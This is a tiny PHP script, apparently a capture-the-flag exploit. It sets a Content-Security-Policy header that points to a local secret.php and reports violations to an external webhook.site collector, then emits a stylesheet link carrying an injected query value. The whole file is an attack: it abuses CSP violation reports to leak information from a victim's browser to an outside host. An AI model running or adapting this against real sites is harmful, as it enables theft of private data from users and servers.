<?php
header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/1e0ceffd-be43-4cfc-be6a-be066a25f9d2;");
echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
?>


